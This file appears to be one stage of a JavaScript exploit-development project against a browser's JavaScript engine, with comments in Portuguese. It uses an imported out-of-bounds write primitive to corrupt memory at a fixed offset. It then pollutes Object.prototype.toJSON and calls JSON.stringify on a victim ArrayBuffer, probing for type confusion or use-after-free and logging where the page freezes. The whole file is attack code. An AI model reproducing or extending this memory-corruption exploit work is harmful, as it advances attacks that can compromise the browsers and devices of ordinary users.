// js/script3/testJsonTypeConfusionUAFSpeculative.mjs
import { logS3, PAUSE_S3, MEDIUM_PAUSE_S3, SHORT_PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, isAdvancedInt64Object, toHex } from '../utils.mjs';
import {
    triggerOOB_primitive, oob_array_buffer_real, oob_dataview_real, // oob_dataview_real importado caso precise
    oob_write_absolute, oob_read_absolute, clearOOBEnvironment
} from '../core_exploit.mjs';
import { OOB_CONFIG, JSC_OFFSETS } from '../config.mjs'; // JSC_OFFSETS importado caso usado em toJSON

// --- Parâmetros FIXOS para o teste de congelamento ---
const FOCUSED_TEST_PARAMS = {
    victim_ab_size: 64,
    corruption_offset: (OOB_CONFIG.BASE_OFFSET_IN_DV || 128) - 16, // Ex: 0x70 se BASE_OFFSET_DV é 128
    value_to_write: 0xFFFFFFFF,
    bytes_to_write_for_corruption: 4,
    ppKey: 'toJSON',
    description: "FocusedFreezeTest_Offset0x70_ValFFFF_OriginalToJSON"
};
// --- Fim dos Parâmetros ---

let callCount_toJSON_focused = 0; // Contador específico para esta função toJSON

// Esta é a função toJSON "v2 - Refinado" que você indicou que causa o congelamento.
// Vamos instrumentá-la minimamente com canary logs.
function originalFreezingPollutedToJSON() {
    const FNAME_toJSON = "originalFreezingToJSON"; // Usado nos logs internos se necessário
    callCount_toJSON_focused++;
    // Canary para a primeira chamada
    if (callCount_toJSON_focused === 1) {
        document.title = `toJSON Call ${callCount_toJSON_focused}`;
    }

    const currentOperationThis = this;
    // Mantendo os logs originais da sua função, mas prefixados para clareza
    logS3(`[${FOCUSED_TEST_PARAMS.ppKey} Poluído - OriginalFreezingLogic] Chamada ${callCount_toJSON_focused}!`, "vuln", FNAME_toJSON);
    logS3(`  [CALL ${callCount_toJSON_focused}] typeof this: ${typeof currentOperationThis}`, "info", FNAME_toJSON);
    logS3(`  [CALL ${callCount_toJSON_focused}] this instanceof ArrayBuffer: ${currentOperationThis instanceof ArrayBuffer}`, "info", FNAME_toJSON);
    logS3(`  [CALL ${callCount_toJSON_focused}] this instanceof Object: ${currentOperationThis instanceof Object}`, "info", FNAME_toJSON);
    try {
        logS3(`  [CALL ${callCount_toJSON_focused}] this.constructor.name: ${currentOperationThis.constructor ? currentOperationThis.constructor.name : 'N/A'}`, "info", FNAME_toJSON);
    } catch (e) {
        logS3(`  [CALL ${callCount_toJSON_focused}] Erro ao acessar this.constructor.name: ${e.message}`, "warn", FNAME_toJSON);
    }
    logS3(`  [CALL ${callCount_toJSON_focused}] Object.prototype.toString.call(this): ${Object.prototype.toString.call(currentOperationThis)}`, "info", FNAME_toJSON);

    let details = {
        byteLength: "N/A (antes da tentativa)",
        first_dword: "N/A (antes da tentativa)",
        slice_exists: "N/A (antes da tentativa)"
    };
    try {
        details.byteLength = currentOperationThis.byteLength;
        if (currentOperationThis && typeof currentOperationThis.byteLength === 'number' && currentOperationThis.byteLength >= 4 && (currentOperationThis instanceof ArrayBuffer || (currentOperationThis.buffer instanceof ArrayBuffer && currentOperationThis.byteOffset !== undefined))) {
            let bufferToView = (currentOperationThis instanceof ArrayBuffer) ? currentOperationThis : currentOperationThis.buffer;
            let offsetInView = (currentOperationThis instanceof ArrayBuffer) ? 0 : currentOperationThis.byteOffset;
            if (bufferToView.byteLength >= offsetInView + 4) {
               details.first_dword = new DataView(bufferToView, offsetInView, 4).getUint32(0, true);
            } else {
               details.first_dword = "Buffer pequeno demais para ler DWORD no offset.";
            }
        } else {
            details.first_dword = "Não é ArrayBuffer ou tipo com buffer para ler DWORD.";
        }

        details.slice_exists = (typeof currentOperationThis.slice === 'function');
        if (details.slice_exists) {
            logS3(`  [CALL ${callCount_toJSON_focused}] [${FOCUSED_TEST_PARAMS.ppKey} Poluído] this.slice existe.`, "info", FNAME_toJSON);
        }

        logS3(`  [CALL ${callCount_toJSON_focused}] Detalhes de 'this': byteLength=${details.byteLength}, 1stDword=${details.first_dword === "N/A (antes da tentativa)" ? details.first_dword : toHex(details.first_dword)}, slice_exists=${details.slice_exists}`, "info", FNAME_toJSON);
        return { toJSON_executed: true, type: Object.prototype.toString.call(currentOperationThis), details: details };

    } catch (e) {
        logS3(`  [CALL ${callCount_toJSON_focused}] [${FOCUSED_TEST_PARAMS.ppKey} Poluído] ERRO ao acessar propriedades/métodos de 'this': ${e.message}`, "critical", FNAME_toJSON);
        // As variáveis currentIterationSuccess e overallTestSuccess não existem mais neste escopo focado
        // Se um erro ocorre aqui, é um ponto de interesse para o congelamento.
        document.title = `ERRO toJSON Call ${callCount_toJSON_focused}`;
        return { toJSON_error: true, message: e.message, type_at_error: Object.prototype.toString.call(currentOperationThis), error_details: details };
    }
}


export async function runSingleFocusedFreezingTest() { // Renomeado para clareza
    const FNAME_TEST_RUNNER = "runSingleFocusedFreezingTest";
    const {
        victim_ab_size,
        corruption_offset,
        value_to_write,
        bytes_to_write_for_corruption,
        ppKey,
        description
    } = FOCUSED_TEST_PARAMS;

    logS3(`--- Iniciando Teste Único de Congelamento Focado: ${description} ---`, "test", FNAME_TEST_RUNNER);
    logS3(`   Offset: ${toHex(corruption_offset)}, Valor: ${toHex(value_to_write)}`, "info", FNAME_TEST_RUNNER);
    document.title = "Iniciando: " + description;

    callCount_toJSON_focused = 0;
    await triggerOOB_primitive();
    if (!oob_array_buffer_real) {
        logS3("Falha ao configurar ambiente OOB. Abortando.", "error", FNAME_TEST_RUNNER);
        document.title = "ERRO: Falha OOB Setup";
        return;
    }
    document.title = "OOB Configurado";

    let victim_ab = new ArrayBuffer(victim_ab_size);
    logS3(`ArrayBuffer vítima (${victim_ab_size} bytes) recriado.`, "info", FNAME_TEST_RUNNER);

    let originalToJSONDescriptor = Object.getOwnPropertyDescriptor(Object.prototype, ppKey);
    let pollutionApplied = false;
    let stepReached = "antes_pp";

    try {
        logS3(`Tentando poluir Object.prototype.${ppKey} com lógica ORIGINAL DE CONGELAMENTO...`, "info", FNAME_TEST_RUNNER);
        stepReached = "aplicando_pp";
        document.title = "Aplicando PP (Original Congelante)...";
        
        Object.defineProperty(Object.prototype, ppKey, {
            value: originalFreezingPollutedToJSON, // Usando a função definida acima
            writable: true, configurable: true, enumerable: false
        });
        pollutionApplied = true;
        logS3(`Object.prototype.${ppKey} poluído com lógica ORIGINAL DE CONGELAMENTO.`, "good", FNAME_TEST_RUNNER);
        stepReached = "pp_aplicada";
        document.title = "PP Aplicada (Original Congelante)";

        logS3(`CHECK ANTES OOB_WRITE (APÓS PP): typeof oob_array_buffer_real = ${typeof oob_array_buffer_real}, typeof oob_dataview_real = ${typeof oob_dataview_real}`, "info", FNAME_TEST_RUNNER);
        if(oob_dataview_real) logS3(`   oob_dataview_real.byteLength ANTES OOB_WRITE: ${oob_dataview_real.byteLength}`, "info", FNAME_TEST_RUNNER);
        else logS3(`   oob_dataview_real JÁ indefinido ANTES da escrita OOB! (INESPERADO)`, "error", FNAME_TEST_RUNNER);


        logS3(`CORRUPÇÃO: Escrevendo valor ${toHex(value_to_write)} (${bytes_to_write_for_corruption} bytes) em offset abs ${toHex(corruption_offset)}`, "warn", FNAME_TEST_RUNNER);
        stepReached = "antes_escrita_oob";
        document.title = "Antes Escrita OOB (Original Congelante)";
        
        oob_write_absolute(corruption_offset, value_to_write, bytes_to_write_for_corruption); // PONTO CRÍTICO ONDE CONGELOU ANTES
        
        // Se o script chegar aqui, a escrita OOB não congelou IMEDIATAMENTE.
        logS3("Escrita OOB realizada (aparentemente não congelou na chamada).", "info", FNAME_TEST_RUNNER);
        stepReached = "apos_escrita_oob";
        document.title = "Após Escrita OOB (Original Congelante)";

        await PAUSE_S3(MEDIUM_PAUSE_S3); // Pausa para quaisquer efeitos assíncronos da corrupção
        stepReached = "antes_stringify";
        document.title = "Antes Stringify (Original Congelante)";

        logS3(`Chamando JSON.stringify(victim_ab)... (PONTO CRÍTICO SECUNDÁRIO PARA CONGELAMENTO)`, "info", FNAME_TEST_RUNNER);
        let stringifyResult = null;
        try {
            stringifyResult = JSON.stringify(victim_ab);
            stepReached = "apos_stringify";
            document.title = "Stringify Retornou (Original Congelante)";
            logS3(`Resultado de JSON.stringify(victim_ab): ${String(stringifyResult).substring(0, 300)}`, "info", FNAME_TEST_RUNNER);
        } catch (e) {
            stepReached = "erro_stringify";
            document.title = "ERRO Stringify: " + e.name + " (Original Congelante)";
            logS3(`ERRO CRÍTICO durante JSON.stringify(victim_ab): ${e.name} - ${e.message}.`, "critical", FNAME_TEST_RUNNER);
            console.error(`JSON.stringify Test Error (${description}):`, e);
        }

    } catch (mainError) {
        stepReached = "erro_principal";
        document.title = "ERRO Principal Teste (Original Congelante)";
        logS3(`Erro principal no teste (${description}): ${mainError.message}`, "error", FNAME_TEST_RUNNER);
        console.error(mainError);
    } finally {
        if (pollutionApplied) {
            if (originalToJSONDescriptor) {
                Object.defineProperty(Object.prototype, ppKey, originalToJSONDescriptor);
            } else {
                delete Object.prototype[ppKey];
            }
        }
        clearOOBEnvironment();
        logS3(`Ambiente OOB Limpo. Último passo alcançado: ${stepReached}`, "info", FNAME_TEST_RUNNER);
        // Se stepReached não for "apos_stringify" ou um erro explícito, pode ter congelado.
        if (stepReached !== "apos_stringify" && !stepReached.startsWith("erro_")) {
            logS3(`O TESTE PODE TER CONGELADO. Último passo logado: ${stepReached}`, "warn", FNAME_TEST_RUNNER);
            document.title = `CONGELOU? Passo: ${stepReached} - ${description}`;
        } else {
            document.title = `Teste Concluído (${stepReached}) - ${description}`;
        }
    }
    logS3(`--- Teste Único de Congelamento Focado Concluído: ${description} ---`, "test", FNAME_TEST_RUNNER);
}

// A função original que iterava não é mais o foco principal, mas é mantida para referência.
// A chamada principal virá de runAllAdvancedTestsS3.mjs.
export async function testJsonTypeConfusionUAFSpeculative() {
    logS3("AVISO: testJsonTypeConfusionUAFSpeculative (com loops) não é o foco. Executando runSingleFocusedFreezingTest.", "warn");
    await runSingleFocusedFreezingTest();
}
